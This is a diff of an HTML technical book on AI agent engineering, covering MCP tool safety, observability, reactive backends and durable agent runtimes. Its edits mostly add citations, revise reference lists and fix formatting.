-<li class="annotatable" data-anchor="ch16-d15"><strong>Partial Failure &amp; Compensating Sagas:</strong> If an agent executes <code>reserve_inventory()</code> (succeeds) followed by <code>create_shipment()</code> (fails permanently), there are no distributed 2PC locks across SaaS APIs. Record each mutating step&#x27;s <strong>compensating action</strong> (<code>release_inventory(reservation_id)</code>) in the run journal and run compensations in reverse order on abort.</li>
+<li class="annotatable" data-anchor="ch16-d14"><strong>Why Step 5 (Output Validation) Matters:</strong> Tool outputs from web pages, Jira tickets, or logs are <strong>untrusted input</strong> <a href="#ch16-refs" class="cite-ref" title="Jump to chapter references">[4]</a>! Validate output schemas, strip credentials/tokens accidentally returned by internal APIs, cap payload size (<code>&lt;= 4 KB</code>), and wrap untrusted text in explicit data delimiters.</li>
+<li class="annotatable" data-anchor="ch16-d15"><strong>Partial Failure &amp; Compensating Sagas:</strong> If an agent executes <code>reserve_inventory()</code> (succeeds) followed by <code>create_shipment()</code> (fails permanently), there are no distributed 2PC locks across SaaS APIs. Record each mutating step&#x27;s <strong>compensating action</strong> (<code>release_inventory(reservation_id)</code>) in the run journal and run compensations in reverse order on abort <a href="#ch16-refs" class="cite-ref" title="Jump to chapter references">[5]</a>.</li>
 </ul>
 </div></details>
 <hr class="wbw-divider"/>
@@ -2961,12 +2944,13 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <hr class="wbw-divider"/>
 <h3 id="ch16-refs" class="annotatable" data-anchor="ch16-b32">Sources &amp; References</h3>
 <ul>
-<li class="annotatable" data-anchor="ch16-b33"><strong><a href="#ch16-refs" class="cite-ref" title="Jump to chapter references">[1]</a></strong> Model Context Protocol (MCP) Architecture Specification (<code>2026-07-28</code>) — <em>Host, Client &amp; Server Isolation, Primitives &amp; Transports</em> — <a href="https://modelcontextprotocol.io/specification/2026-07-28/architecture" target="_blank" rel="noopener">modelcontextprotocol.io/specification/2026-07-28/architecture</a></li>
-<li class="annotatable" data-anchor="ch16-b34"><strong><a href="#ch16-refs" class="cite-ref" title="Jump to chapter references">[2]</a></strong> Anthropic Engineering, <em>Writing Effective Tools for Agents — With Agents</em> (2025)</li>
+<li class="annotatable" data-anchor="ch16-b33"><strong><a href="#ch16-refs" class="cite-ref" title="Jump to chapter references">[1]</a></strong> Model Context Protocol (MCP) Documentation, <em>Core Architecture: Host, Client &amp; Server Isolation, Primitives &amp; Transports</em> — <a href="https://modelcontextprotocol.io/docs/learn/architecture" target="_blank" rel="noopener">modelcontextprotocol.io/docs/learn/architecture</a></li>
+<li class="annotatable" data-anchor="ch16-b34"><strong><a href="#ch16-refs" class="cite-ref" title="Jump to chapter references">[2]</a></strong> Anthropic Engineering, <em>Writing Effective Tools for AI Agents — Using AI Agents</em> (2025) — <a href="https://www.anthropic.com/engineering/writing-tools-for-agents" target="_blank" rel="noopener">anthropic.com/engineering/writing-tools-for-agents</a></li>
 <li class="annotatable" data-anchor="ch16-b35"><strong><a href="#ch16-refs" class="cite-ref" title="Jump to chapter references">[3]</a></strong> Edoardo Debenedetti et al., <em>Defeating Prompt Injections by Design (CaMeL)</em> (Google DeepMind, 2025) — <a href="https://arxiv.org/abs/2503.18813" target="_blank" rel="noopener">arxiv.org/abs/2503.18813</a></li>
+<li class="annotatable" data-anchor="ch16-b36"><strong><a href="#ch16-refs" class="cite-ref" title="Jump to chapter references">[4]</a></strong> OWASP GenAI Security Project, <em>OWASP Top 10 for Large Language Model Applications (Indirect Prompt Injection &amp; Improper Output Handling)</em> — <a href="https://genai.owasp.org/llm-top-10/" target="_blank" rel="noopener">genai.owasp.org/llm-top-10</a></li>
+<li class="annotatable" data-anchor="ch16-b37"><strong><a href="#ch16-refs" class="cite-ref" title="Jump to chapter references">[5]</a></strong> Hector Garcia-Molina &amp; Kenneth Salem, <em>Sagas</em> (ACM SIGMOD 1987) — Compensating Transactions for Long-Lived Workflows</li>
 </ul><nav class="ch-pager"><button class="ch-pager-btn prev" onclick="openChapter('ch15')"><span class="pager-dir">← Previous Chapter</span><span class="pager-title">15. Retrieval Math &amp; Vector Indexes</span></button><button class="ch-pager-btn next" onclick="openChapter('ch17')"><span class="pager-dir">Next Chapter →</span><span class="pager-title">17. Agent Observability &amp; Replay</span></button></nav></article><article id="chap-ch17" class="chapter-article" data-ch="ch17"><h1 class="ch-title">Chapter 17: Agent Observability (OpenTelemetry), Deterministic Replay &amp; Canary Rollouts</h1>
-<div class="ch-kicker">Part III · AI &amp; LLM Engineering Systems · 7 min core · 16 min with deep dives</div>
-<div class="depth-bar"><div class="depth-meta"><span class="depth-pill-tag">Progressive Disclosure</span><span class="depth-desc">2 Deep Dives available — read concise core or expand all:</span></div><div class="depth-switch" role="group" aria-label="Reading depth"><button type="button" class="depth-btn active" data-depth="core" onclick="setReadingDepth('core')">Core (~8m)</button><button type="button" class="depth-btn" data-depth="deep" onclick="setReadingDepth('deep')">Deep Dive (~18m)</button></div></div>
+<div class="ch-kicker">Part IV · Autonomous Agent Systems · 7 min core · 16 min with deep dives</div>
 <p class="annotatable" data-anchor="ch17-b01">When a REST microservice fails, it throws an <code>HTTP 500</code> and a stack trace.</p>
 <p class="annotatable" data-anchor="ch17-b02">When a <strong>multi-step AI agent</strong> fails, the HTTP status is <strong><code>200 OK</code></strong>! On Step 3 of a 6-step run, a two-word prompt tweak caused the planner to pass <code>include_archived=false</code>, which returned <code>0</code> rows, which convinced the synthesizer to give the user a plausible-sounding wrong answer.</p>
 <p class="annotatable" data-anchor="ch17-b03">Let us look at the bottom middle of the diagram in Chapter 15 to see how production teams trace, unit-test, and safely roll out non-deterministic agents <a href="#ch17-refs" class="cite-ref" title="Jump to chapter references">[1, 2, 3]</a>.</p>
@@ -3034,7 +3018,7 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <td><strong>3. Binary Rubric LLM-as-Judge</strong></td>
 <td>Evaluates responses with explicit <strong><code>PASS/FAIL</code> binary checklists</strong> + mandatory evidence quotes.</td>
 <td>Async CI &amp; <code>5%</code> Kafka prod sample</td>
-<td>Avoids noisy <code>1–10</code> rating variance; catches faithfulness and tone regressions <a href="#ch17-refs" class="cite-ref" title="Jump to chapter references">[2]</a>.</td>
+<td>Avoids noisy <code>1–10</code> rating variance; catches faithfulness and tone regressions <a href="#ch17-refs" class="cite-ref" title="Jump to chapter references">[2, 4]</a>.</td>
 </tr>
 </tbody></table></div>
 <hr class="wbw-divider"/>
@@ -3083,12 +3067,12 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <hr class="wbw-divider"/>
 <h3 id="ch17-refs" class="annotatable" data-anchor="ch17-b31">Sources &amp; References</h3>
 <ul>
-<li class="annotatable" data-anchor="ch17-b32"><strong><a href="#ch17-refs" class="cite-ref" title="Jump to chapter references">[1]</a></strong> OpenTelemetry Specification, <em>Semantic Conventions for Generative AI Systems (<code>gen_ai.</em></code>)* — <a href="https://opentelemetry.io/docs/specs/semconv/gen-ai/" target="_blank" rel="noopener">opentelemetry.io/docs/specs/semconv/gen-ai</a></li>
+<li class="annotatable" data-anchor="ch17-b32"><strong><a href="#ch17-refs" class="cite-ref" title="Jump to chapter references">[1]</a></strong> OpenTelemetry Specification, <em>Semantic Conventions for Generative AI Systems (<code>gen_ai.*</code>)</em> — <a href="https://opentelemetry.io/docs/specs/semconv/gen-ai/" target="_blank" rel="noopener">opentelemetry.io/docs/specs/semconv/gen-ai</a></li>
 <li class="annotatable" data-anchor="ch17-b33"><strong><a href="#ch17-refs" class="cite-ref" title="Jump to chapter references">[2]</a></strong> Hamel Husain &amp; Eugene Yan, <em>Your AI Product Needs Evals (Applied LLMs)</em> — <a href="https://applied-llms.org/" target="_blank" rel="noopener">applied-llms.org</a></li>
 <li class="annotatable" data-anchor="ch17-b34"><strong><a href="#ch17-refs" class="cite-ref" title="Jump to chapter references">[3]</a></strong> Shunyu Yao et al., <em>tau-bench: A Benchmark for Tool-Agent-User Interaction in Real-World Domains</em> (2024) — <a href="https://arxiv.org/abs/2406.12045" target="_blank" rel="noopener">arxiv.org/abs/2406.12045</a></li>
+<li class="annotatable" data-anchor="ch17-b35"><strong><a href="#ch17-refs" class="cite-ref" title="Jump to chapter references">[4]</a></strong> Lianmin Zheng et al., <em>Judging LLM-as-a-Judge with MT-Bench and Chatbot Arena</em> (NeurIPS 2023) — <a href="https://arxiv.org/abs/2306.05685" target="_blank" rel="noopener">arxiv.org/abs/2306.05685</a></li>
 </ul><nav class="ch-pager"><button class="ch-pager-btn prev" onclick="openChapter('ch16')"><span class="pager-dir">← Previous Chapter</span><span class="pager-title">16. MCP, Tool Contracts &amp; Safety</span></button><button class="ch-pager-btn next" onclick="openChapter('ch18')"><span class="pager-dir">Next Chapter →</span><span class="pager-title">18. Reactive Backends &amp; Concurrency</span></button></nav></article><article id="chap-ch18" class="chapter-article" data-ch="ch18"><h1 class="ch-title">Chapter 18: Reactive Agent Backends (Spring WebFlux), High-Contention Concurrency &amp; Keyset Pagination</h1>
-<div class="ch-kicker">Part III · AI &amp; LLM Engineering Systems · 8 min core · 17 min with deep dives</div>
-<div class="depth-bar"><div class="depth-meta"><span class="depth-pill-tag">Progressive Disclosure</span><span class="depth-desc">2 Deep Dives available — read concise core or expand all:</span></div><div class="depth-switch" role="group" aria-label="Reading depth"><button type="button" class="depth-btn active" data-depth="core" onclick="setReadingDepth('core')">Core (~8m)</button><button type="button" class="depth-btn" data-depth="deep" onclick="setReadingDepth('deep')">Deep Dive (~18m)</button></div></div>
+<div class="ch-kicker">Part IV · Autonomous Agent Systems · 8 min core · 17 min with deep dives</div>
 <p class="annotatable" data-anchor="ch18-b01">An LLM is only 20% of a production agent platform. The other 80% is high-concurrency backend systems engineering:</p>
 <ol>
 <li value="1" class="annotatable" data-anchor="ch18-b02">Holding <strong>50,000 open streaming connections</strong> for 10 seconds each without exhausting OS threads.</li>
@@ -3113,12 +3097,12 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <li value="1" class="annotatable" data-anchor="ch18-d02"><strong>Cooperative Cancellation Chain:</strong></li>
 </ol>
 <ul>
-<li class="annotatable" data-anchor="ch18-d03">Netty detects TCP <code>FIN/RST</code> on the SSE socket -&gt; triggers Reactor <code>.doOnCancel()</code> (or <code>AbortSignal</code> / <code>Context</code> cancellation).</li>
+<li class="annotatable" data-anchor="ch18-d03">Netty detects TCP <code>FIN/RST</code> on the SSE socket -&gt; triggers Reactor <code>.doOnCancel()</code> (or <code>AbortSignal</code> / <code>Context</code> cancellation) <a href="#ch18-refs" class="cite-ref" title="Jump to chapter references">[1, 4]</a>.</li>
 <li class="annotatable" data-anchor="ch18-d04">The orchestrator immediately aborts the upstream HTTP stream to the LLM provider (stopping token generation &amp; billing mid-sentence) and sends JSON-RPC <code>notifications/cancelled</code> to any in-flight MCP tool servers.</li>
 </ul>
 <ol>
-<li value="2" class="annotatable" data-anchor="ch18-d05"><strong>Thread/Worker Bulkhead Isolation:</strong> Never share one worker pool across fast API reads, slow PDF parsing, and untrusted tool sandboxes. Isolate into separate bounded pools (<strong>Bulkhead Pattern</strong>) so a spike in slow PDF ingestion can only saturate its own <code>32</code>-worker pool while normal chat streams stay sub-second.</li>
-<li value="3" class="annotatable" data-anchor="ch18-d06"><strong>Reactive Backpressure:</strong> If a fast producer (<code>500 tokens/sec</code> batch stream or log tail) overwhelms a slow mobile client or DB sink, unbounded memory buffers trigger <code>OutOfMemoryError</code>. Enforce bounded ring buffers (<code>onBackpressureBuffer(256, DROP_OLDEST)</code> for UI progress events, or TCP window throttling / <code>429 Retry-After</code> at ingress).</li>
+<li value="2" class="annotatable" data-anchor="ch18-d05"><strong>Thread/Worker Bulkhead Isolation:</strong> Never share one worker pool across fast API reads, slow PDF parsing, and untrusted tool sandboxes. Isolate into separate bounded pools (<strong>Bulkhead Pattern</strong>) so a spike in slow PDF ingestion can only saturate its own <code>32</code>-worker pool while normal chat streams stay sub-second <a href="#ch18-refs" class="cite-ref" title="Jump to chapter references">[1]</a>.</li>
+<li value="3" class="annotatable" data-anchor="ch18-d06"><strong>Reactive Backpressure:</strong> If a fast producer (<code>500 tokens/sec</code> batch stream or log tail) overwhelms a slow mobile client or DB sink, unbounded memory buffers trigger <code>OutOfMemoryError</code>. Enforce bounded ring buffers (<code>onBackpressureBuffer(256, DROP_OLDEST)</code> for UI progress events, or TCP window throttling / <code>429 Retry-After</code> at ingress) <a href="#ch18-refs" class="cite-ref" title="Jump to chapter references">[4]</a>.</li>
 </ol>
 </div></details>
 <hr class="wbw-divider"/>
@@ -3176,7 +3160,7 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <li value="2" class="annotatable" data-anchor="ch18-b26"><strong>SQL Three-Valued <code>NULL</code> Logic (<code>COUNT</code> &amp; <code>AVG</code>):</strong></li>
 </ol>
 <ul>
-<li class="annotatable" data-anchor="ch18-b27">On 10 rows where 3 have <code>email = NULL</code>: *<em><code>COUNT(</em>)</code> is <code>10</code><strong>, </strong><code>COUNT(email)</code> is <code>7</code>**, and <code>AVG(col)</code> divides <code>SUM(col)</code> by <code>COUNT(col)</code> (ignoring <code>NULL</code>s!). Also prefer <code>WHERE NOT EXISTS</code> over <code>NOT IN</code> (which returns <code>0 rows</code> if the subquery contains a single <code>NULL</code>).</li>
+<li class="annotatable" data-anchor="ch18-b27">On 10 rows where 3 have <code>email = NULL</code>: <strong><code>COUNT(*)</code> is <code>10</code></strong>, <strong><code>COUNT(email)</code> is <code>7</code></strong>, and <code>AVG(col)</code> divides <code>SUM(col)</code> by <code>COUNT(col)</code> (ignoring <code>NULL</code>s!). Also prefer <code>WHERE NOT EXISTS</code> over <code>NOT IN</code> (which returns <code>0 rows</code> if the subquery contains a single <code>NULL</code>).</li>
 </ul>
 <ol>
 <li value="3" class="annotatable" data-anchor="ch18-b28"><strong>OLTP (Row Store) vs. OLAP (Columnar Store):</strong></li>
@@ -3214,11 +3198,11 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <h3 id="ch18-refs" class="annotatable" data-anchor="ch18-b40">Sources &amp; References</h3>
 <ul>
 <li class="annotatable" data-anchor="ch18-b41"><strong><a href="#ch18-refs" class="cite-ref" title="Jump to chapter references">[1]</a></strong> Spring AI &amp; Spring WebFlux Reference — <em>Reactive <code>ChatClient</code>, <code>Flux</code> SSE Streaming &amp; <code>Schedulers.boundedElastic()</code></em> — <a href="https://docs.spring.io/spring-ai/reference/" target="_blank" rel="noopener">docs.spring.io/spring-ai/reference</a></li>
-<li class="annotatable" data-anchor="ch18-b42"><strong><a href="#ch18-refs" class="cite-ref" title="Jump to chapter references">[2]</a></strong> Brian Goetz et al., <em>Java Concurrency in Practice</em> &amp; JDK <code>LongAdder</code> — CAS Contention vs. Striped Counters</li>
-<li class="annotatable" data-anchor="ch18-b43"><strong><a href="#ch18-refs" class="cite-ref" title="Jump to chapter references">[3]</a></strong> Martin Kleppmann, <em>Designing Data-Intensive Applications (DDIA)</em>, Chapter 3 (Storage Engines) &amp; Chapter 8 (Fencing Tokens &amp; Distributed Locks)</li>
+<li class="annotatable" data-anchor="ch18-b42"><strong><a href="#ch18-refs" class="cite-ref" title="Jump to chapter references">[2]</a></strong> Brian Goetz et al., <em>Java Concurrency in Practice</em> &amp; JDK <code>java.util.concurrent.atomic.LongAdder</code> — CAS Contention vs. Striped Counters</li>
+<li class="annotatable" data-anchor="ch18-b43"><strong><a href="#ch18-refs" class="cite-ref" title="Jump to chapter references">[3]</a></strong> Martin Kleppmann, <em>How to do distributed locking (Fencing Tokens)</em> &amp; <em>Designing Data-Intensive Applications (DDIA)</em> — <a href="https://martin.kleppmann.com/2016/02/08/how-to-do-distributed-locking.html" target="_blank" rel="noopener">martin.kleppmann.com</a></li>
+<li class="annotatable" data-anchor="ch18-b44"><strong><a href="#ch18-refs" class="cite-ref" title="Jump to chapter references">[4]</a></strong> Project Reactor Reference Guide, <em>Reactive Streams Backpressure, Cancellation &amp; Schedulers</em> — <a href="https://projectreactor.io/docs/core/release/reference/" target="_blank" rel="noopener">projectreactor.io/docs/core/release/reference</a></li>
 </ul><nav class="ch-pager"><button class="ch-pager-btn prev" onclick="openChapter('ch17')"><span class="pager-dir">← Previous Chapter</span><span class="pager-title">17. Agent Observability &amp; Replay</span></button><button class="ch-pager-btn next" onclick="openChapter('ch19')"><span class="pager-dir">Next Chapter →</span><span class="pager-title">19. Durable Agent Runtime &amp; 1M/Day</span></button></nav></article><article id="chap-ch19" class="chapter-article" data-ch="ch19"><h1 class="ch-title">Chapter 19: Durable Agent State Machines, Async Run APIs &amp; Scaling to 1M Runs/Day</h1>
 <div class="ch-kicker">Part IV · Autonomous Agent Systems · 8 min core · 18 min with deep dives</div>
-<div class="depth-bar"><div class="depth-meta"><span class="depth-pill-tag">Progressive Disclosure</span><span class="depth-desc">2 Deep Dives available — read concise core or expand all:</span></div><div class="depth-switch" role="group" aria-label="Reading depth"><button type="button" class="depth-btn active" data-depth="core" onclick="setReadingDepth('core')">Core (~8m)</button><button type="button" class="depth-btn" data-depth="deep" onclick="setReadingDepth('deep')">Deep Dive (~18m)</button></div></div>
 <p class="annotatable" data-anchor="ch19-b01">In a prototype, an agent is a <code>while</code> loop inside an <code>HTTP POST /chat</code> handler.</p>
 <p class="annotatable" data-anchor="ch19-b02">In production, that design collapses the first afternoon you get real traffic:</p>
 <ol>
@@ -3320,7 +3304,7 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 </tr>
 <tr class="annotatable" data-anchor="ch19-b12">
 <td><strong><code>GET /agent/runs/{id}/events</code></strong></td>
-<td>Server-Sent Events (<code>SSE</code>) accepting <strong><code>Last-Event-ID: 42</code></strong> header.</td>
+<td>Server-Sent Events (<code>SSE</code>) accepting <strong><code>Last-Event-ID: 42</code></strong> header <a href="#ch19-refs" class="cite-ref" title="Jump to chapter references">[4]</a>.</td>
 <td>Replays any missed events <code>&gt; 42</code> from a <strong>Redis Stream (<code>XREAD</code>)</strong> before tailing live tokens—surviving mobile Wi-Fi drops seamlessly!</td>
 </tr>
 <tr class="annotatable" data-anchor="ch19-b13">
@@ -3356,8 +3340,8 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <li value="3" class="annotatable" data-anchor="ch19-d08"><strong>Mid-Step Pod Death Walkthrough:</strong></li>
 </ol>
 <ul>
-<li class="annotatable" data-anchor="ch19-d09">Suppose Pod A finishes Steps <code>1..3</code> (committed to <code>agent_steps</code>), calls <code>create_jira_ticket()</code> in Step <code>4</code> with <code>idempotency_key = SHA256(run_id + &quot;:4&quot;)</code>, and OOM-crashes <em>before</em> writing Step 4&#x27;s result to Postgres.</li>
-<li class="annotatable" data-anchor="ch19-d10"><code>15 seconds</code> later, a lease-reaper re-queues <code>run_id</code>. Pod B loads Steps <code>1..3</code> directly from <code>agent_steps</code> (<code>0</code> LLM tokens spent!), re-invokes Step <code>4</code> with the <strong>exact same deterministic <code>idempotency_key</code></strong>, receives the cached Jira ticket ID from the deduplication layer, commits Step <code>4</code> with <code>lease_epoch</code>, and finishes the run!</li>
+<li class="annotatable" data-anchor="ch19-d09">Suppose Pod A finishes Steps <code>1..3</code> (committed to <code>agent_steps</code>), calls <code>create_jira_ticket()</code> in Step <code>4</code> with <code>idempotency_key = SHA256(run_id + &quot;:4&quot;)</code>, and OOM-crashes <em>before</em> writing Step 4&#x27;s result to Postgres <a href="#ch19-refs" class="cite-ref" title="Jump to chapter references">[1, 2]</a>.</li>
+<li class="annotatable" data-anchor="ch19-d10"><code>15 seconds</code> later, a lease-reaper re-queues <code>run_id</code>. Pod B loads Steps <code>1..3</code> directly from <code>agent_steps</code> (<code>0</code> LLM tokens spent!), re-invokes Step <code>4</code> with the <strong>exact same deterministic <code>idempotency_key</code></strong>, receives the cached Jira ticket ID from the deduplication layer, commits Step <code>4</code> with <code>lease_epoch</code>, and finishes the run <a href="#ch19-refs" class="cite-ref" title="Jump to chapter references">[1, 3]</a>!</li>
 </ul>
 </div></details>
 <hr class="wbw-divider"/>
@@ -3380,7 +3364,7 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 </ol>
 <ul>
 <li class="annotatable" data-anchor="ch19-b24">Standard request-count rate limiting (<code>100 req/min</code>) fails when Request A uses <code>400</code> tokens and Request B uses <code>60,000</code> tokens.</li>
-<li class="annotatable" data-anchor="ch19-b25"><strong>Pre-Flight Reserve + Post-Turn Reconcile:</strong> Before calling the LLM, atomically reserve <code>estimated_input_tokens + max_output_tokens</code> in a per-tenant Redis Lua token bucket. Once the stream finishes, refund <code>max_output_tokens - actual_output_tokens</code> and increment <code>tenant_daily_spend_usd</code>—halting runaway tenants before they exceed their contract cap.</li>
+<li class="annotatable" data-anchor="ch19-b25"><strong>Pre-Flight Reserve + Post-Turn Reconcile:</strong> Before calling the LLM, atomically reserve <code>estimated_input_tokens + max_output_tokens</code> in a per-tenant Redis Lua token bucket <a href="#ch19-refs" class="cite-ref" title="Jump to chapter references">[5]</a>. Once the stream finishes, refund <code>max_output_tokens - actual_output_tokens</code> and increment <code>tenant_daily_spend_usd</code>—halting runaway tenants before they exceed their contract cap.</li>
 </ul>
 <details class="deep-dive"><summary class="deep-dive-summary"><span class="dd-left"><span class="dd-badge">🔬 Deep Dive</span><span class="dd-title">Envelope Capacity Math &amp; Fair Queuing for 1,000,000 Runs/Day</span></span><span class="dd-time">+5 min</span></summary><div class="deep-dive-body">
 <p class="annotatable" data-anchor="ch19-d11">Always ground a <code>1M runs/day</code> design prompt with 60-second back-of-the-envelope numbers:</p>
@@ -3392,7 +3376,7 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <li class="annotatable" data-anchor="ch19-d16">If an active run takes <code>6 seconds</code> on average, Little&#x27;s Law (<code>L = λ × W</code>) gives <code>60 runs/s × 6s = 360</code> concurrent active runs—easily served by <strong><code>8–12</code> reactive orchestrator pods</strong>!</li>
 <li class="annotatable" data-anchor="ch19-d17"><strong>Multi-Tenant Noisy-Neighbor Isolation:</strong></li>
 <li class="annotatable" data-anchor="ch19-d18">Never put interactive user chat runs and <code>50,000-item</code> offline batch runs into the same FIFO queue!</li>
-<li class="annotatable" data-anchor="ch19-d19">Split into <strong><code>agent.runs.interactive</code></strong> (SLO <code>&lt; 3s</code> TTFT, dedicatedTPM reservation) and <strong><code>agent.runs.batch</code></strong> (spot/provisioned-spillover capacity), using <strong>Weighted Fair Queuing / Deficit Round Robin per <code>tenant_id</code></strong> so Tenant A submitting 10,000 jobs cannot delay Tenant B&#x27;s single interactive request by more than one scheduling quantum.</li>
+<li class="annotatable" data-anchor="ch19-d19">Split into <strong><code>agent.runs.interactive</code></strong> (SLO <code>&lt; 3s</code> TTFT, dedicatedTPM reservation) and <strong><code>agent.runs.batch</code></strong> (spot/provisioned-spillover capacity), using <strong>Weighted Fair Queuing / Deficit Round Robin per <code>tenant_id</code></strong> so Tenant A submitting 10,000 jobs cannot delay Tenant B&#x27;s single interactive request by more than one scheduling quantum <a href="#ch19-refs" class="cite-ref" title="Jump to chapter references">[3, 5]</a>.</li>
 </ul>
 </div></details>
 <hr class="wbw-divider"/>
@@ -3423,12 +3407,13 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <hr class="wbw-divider"/>
 <h3 id="ch19-refs" class="annotatable" data-anchor="ch19-b35">Sources &amp; References</h3>
 <ul>
-<li class="annotatable" data-anchor="ch19-b36"><strong><a href="#ch19-refs" class="cite-ref" title="Jump to chapter references">[1]</a></strong> Temporal Engineering, <em>Durable Execution for AI Agents &amp; Human-in-the-Loop Workflows</em> (2025) — <a href="https://temporal.io/" target="_blank" rel="noopener">temporal.io</a></li>
-<li class="annotatable" data-anchor="ch19-b37"><strong><a href="#ch19-refs" class="cite-ref" title="Jump to chapter references">[2]</a></strong> Anthropic &amp; OpenAI API Guides, <em>Streaming Responses, Background Runs &amp; Rate-Limit Token Buckets</em> (2025–2026)</li>
-<li class="annotatable" data-anchor="ch19-b38"><strong><a href="#ch19-refs" class="cite-ref" title="Jump to chapter references">[3]</a></strong> Martin Kleppmann, <em>Designing Data-Intensive Applications (DDIA)</em> — Event-Driven State Machines, Leases &amp; Idempotency</li>
+<li class="annotatable" data-anchor="ch19-b36"><strong><a href="#ch19-refs" class="cite-ref" title="Jump to chapter references">[1]</a></strong> Temporal Documentation, <em>Durable Execution for Long-Running Workflows &amp; AI Agents</em> — <a href="https://docs.temporal.io/" target="_blank" rel="noopener">docs.temporal.io</a></li>
+<li class="annotatable" data-anchor="ch19-b37"><strong><a href="#ch19-refs" class="cite-ref" title="Jump to chapter references">[2]</a></strong> LangGraph Documentation, <em>Durable Execution, Checkpointers &amp; Human-in-the-Loop Interrupts</em> — <a href="https://docs.langchain.com/oss/python/langgraph/durable-execution" target="_blank" rel="noopener">docs.langchain.com/oss/python/langgraph/durable-execution</a></li>
+<li class="annotatable" data-anchor="ch19-b38"><strong><a href="#ch19-refs" class="cite-ref" title="Jump to chapter references">[3]</a></strong> Martin Kleppmann, <em>Designing Data-Intensive Applications (DDIA)</em> &amp; <em>How to do distributed locking</em> — <a href="https://martin.kleppmann.com/2016/02/08/how-to-do-distributed-locking.html" target="_blank" rel="noopener">martin.kleppmann.com</a></li>
+<li class="annotatable" data-anchor="ch19-b39"><strong><a href="#ch19-refs" class="cite-ref" title="Jump to chapter references">[4]</a></strong> WHATWG HTML Living Standard, <em>Server-Sent Events (<code>EventSource</code> &amp; <code>Last-Event-ID</code> Reconnection)</em> — <a href="https://html.spec.whatwg.org/multipage/server-sent-events.html" target="_blank" rel="noopener">html.spec.whatwg.org/multipage/server-sent-events.html</a></li>
+<li class="annotatable" data-anchor="ch19-b40"><strong><a href="#ch19-refs" class="cite-ref" title="Jump to chapter references">[5]</a></strong> Stripe Engineering, <em>Scaling Your API with Rate Limiters &amp; Load Shedders</em> — <a href="https://stripe.com/blog/rate-limiters" target="_blank" rel="noopener">stripe.com/blog/rate-limiters</a></li>
 </ul><nav class="ch-pager"><button class="ch-pager-btn prev" onclick="openChapter('ch18')"><span class="pager-dir">← Previous Chapter</span><span class="pager-title">18. Reactive Backends &amp; Concurrency</span></button><button class="ch-pager-btn next" onclick="openChapter('ch20')"><span class="pager-dir">Next Chapter →</span><span class="pager-title">20. Agent System Design Stories</span></button></nav></article><article id="chap-ch20" class="chapter-article" data-ch="ch20"><h1 class="ch-title">Chapter 20: End-to-End Agent System Design Stories (Coding, MCP Enterprise, Support &amp; Research)</h1>
 <div class="ch-kicker">Part IV · Autonomous Agent Systems · 9 min core · 20 min with deep dives</div>
-<div class="depth-bar"><div class="depth-meta"><span class="depth-pill-tag">Progressive Disclosure</span><span class="depth-desc">2 Deep Dives available — read concise core or expand all:</span></div><div class="depth-switch" role="group" aria-label="Reading depth"><button type="button" class="depth-btn active" data-depth="core" onclick="setReadingDepth('core')">Core (~8m)</button><button type="button" class="depth-btn" data-depth="deep" onclick="setReadingDepth('deep')">Deep Dive (~18m)</button></div></div>
 <p class="annotatable" data-anchor="ch20-b01">In a senior GenAI or Agent System Design interview, the prompt is intentionally ambiguous:</p>
 <p class="annotatable" data-anchor="ch20-b02"><em>&quot;Design an autonomous bug-fixing agent for our monorepo&quot;</em> or <em>&quot;Design an enterprise assistant connecting to Git, Jira, and Postgres.&quot;</em></p>
 <p class="annotatable" data-anchor="ch20-b03">Candidates who jump straight into drawing vector databases or naming SDKs lose structure fast. Strong candidates drive a repeatable <strong>12-Step First-Principles Agent Blueprint</strong>, starting with the simplest viable architecture and adding autonomy only where deterministic code falls short <a href="#ch20-refs" class="cite-ref" title="Jump to chapter references">[1, 2, 3]</a>.</p>
@@ -3519,22 +3504,22 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 </tr></thead><tbody>
 <tr class="annotatable" data-anchor="ch20-b07">
 <td><strong>A. Scope &amp; Justification (<code>5 min</code>)</strong></td>
-<td><strong>1.</strong> Clarify goal, users, success metrics &amp; <em>prohibited outcomes</em>.&lt;br&gt;<strong>2.</strong> Pin scale, p95 latency, cost/task &amp; privacy constraints.&lt;br&gt;<strong>3.</strong> Justify <strong>Single Call vs. Workflow vs. Agent</strong> <a href="#ch20-refs" class="cite-ref" title="Jump to chapter references">[1]</a>.</td>
+<td><strong>1.</strong> Clarify goal, users, success metrics &amp; <em>prohibited outcomes</em>.<br/><strong>2.</strong> Pin scale, p95 latency, cost/task &amp; privacy constraints.<br/><strong>3.</strong> Justify <strong>Single Call vs. Workflow vs. Agent</strong> <a href="#ch20-refs" class="cite-ref" title="Jump to chapter references">[1]</a>.</td>
 <td>Never default to an open-ended agent if a deterministic workflow handles <code>80%+</code> of traffic!</td>
 </tr>
 <tr class="annotatable" data-anchor="ch20-b08">
 <td><strong>B. Intelligence &amp; Context (<code>10 min</code>)</strong></td>
-<td><strong>4.</strong> Tiered model routing &amp; fallback strategy.&lt;br&gt;<strong>5.</strong> Context routing (<code>Prompt</code> vs <code>RAG</code> vs <code>4-Tier Memory</code> vs <code>Live Tool</code>) + KV-cache prefix order.</td>
+<td><strong>4.</strong> Tiered model routing &amp; fallback strategy.<br/><strong>5.</strong> Context routing (<code>Prompt</code> vs <code>RAG</code> vs <code>4-Tier Memory</code> vs <code>Live Tool</code>) + KV-cache prefix order.</td>
 <td>Put static schemas first; pre-filter RAG by ACLs; keep live state behind tools.</td>
 </tr>
 <tr class="annotatable" data-anchor="ch20-b09">
 <td><strong>C. Tools, Loop &amp; Runtime (<code>15 min</code>)</strong></td>
